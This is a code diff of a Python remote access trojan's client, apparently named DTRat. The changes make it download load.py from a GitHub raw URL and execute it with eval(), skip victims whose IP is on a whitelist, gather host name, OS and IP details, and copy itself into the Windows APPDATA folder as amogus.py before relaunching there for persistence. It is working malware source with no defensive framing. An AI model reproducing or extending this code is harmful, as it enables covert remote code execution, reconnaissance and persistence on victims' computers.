@@ -4,15 +4,26 @@ import time
 import os, sys
 import platform
 
+def load(url):
+    return str(requests.get(url).content.decode("utf-8"))
+
+ip = ""
 while ip == "":
     try:
-        ip = requests.get("http://ifconfig.me").content.decode("utf-8")
+        ip = load("http://ifconfig.me")
     except:
         print("Connection Error: wait 10sec")
         time.sleep(10)
-eval(requests.get("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)).content.decode("utf-8"))
+whitelist = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/whitelist-ip.txt").split("\n")
+inidata = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/config.ini?q={}".format(time.time()))
 
-inidata = requests.get("https://raw.githubusercontent.com/DTRat/dtrat-new/main/config.ini?q={}".format(time.time())).content.decode("utf-8")
+eval(load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)))
+
+if ip in whitelist:
+    print("Whitelist detected!")
+    if "whitelist" in dir():
+        whitelist()
+    sys.exit(0)
 
 # Fuck configparser All homies use for loop.
 config = {}
@@ -67,6 +78,19 @@ def define_caption():
     caption = "**HOST:** `"+platform.uname()[1]+"`\n" + \
           "**OS:**   `"+str(platform.platform())+"`\n" + \
           "**IP**    `"+ip+"`"
+
+def self_clone(name):
+    f = open(sys.argv[0],"r").read()
+    w = open(name,"w")
+    w.write(f)
+    w.flush()
+    w.close()
+
+if not os.path.exists(os.environ["APPDATA"]+"/amogus.py"):
+    self_clone(os.environ["APPDATA"]+"/amogus.py")
+    if "first_setup" in dir():
+        first_setup()
+    sys.exit(os.system(os.environ["APPDATA"]+"/amogus.py"))
 
 if "setup" in dir():
         setup()
